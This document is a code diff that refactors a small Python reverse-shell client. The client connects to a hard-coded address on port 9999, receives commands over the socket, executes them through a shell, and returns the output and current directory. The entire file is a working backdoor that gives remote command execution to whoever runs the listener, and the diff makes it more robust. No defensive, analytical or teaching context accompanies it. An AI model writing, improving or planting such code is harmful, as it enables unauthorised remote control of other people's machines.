@@ -2,7 +2,6 @@ import os
 import socket
 import subprocess
 
-
 s = socket.socket()
 host = '10.100.102.10'
 port = 9999
@@ -10,16 +9,24 @@ s.connect((host, port))
 
 while True:
     data = s.recv(1024)
-    if data.decode("utf-8").startswith("cd "):
-        os.chdir(data[3:].decode("utf-8"))
-        s.send(str.encode(str(os.getcwd() + '$ ')))  # Send the updated directory as a response
+    decoded_data = data.decode("utf-8")
+
+    if decoded_data.startswith("cd "):
+        try:
+            os.chdir(decoded_data[3:].strip())
+        except OSError:
+            pass
+        response = os.getcwd() + '$ '
+        s.send(str.encode(response))
+        print(response, end='')
         continue
+
     if len(data) > 0:
-        cmd = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        output_bytes = cmd.stdout.read() + cmd.stderr.read()
+        process = subprocess.Popen(decoded_data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output_bytes = process.stdout.read() + process.stderr.read()
         output_str = output_bytes.decode("utf-8", errors='ignore')
-        s.send(str.encode(output_str + str(os.getcwd() + '$ ')))
+        response = output_str + os.getcwd() + '$ '
+        s.send(str.encode(response))
         print(output_str, end='')
-        
-# Close connection
+
 s.close()
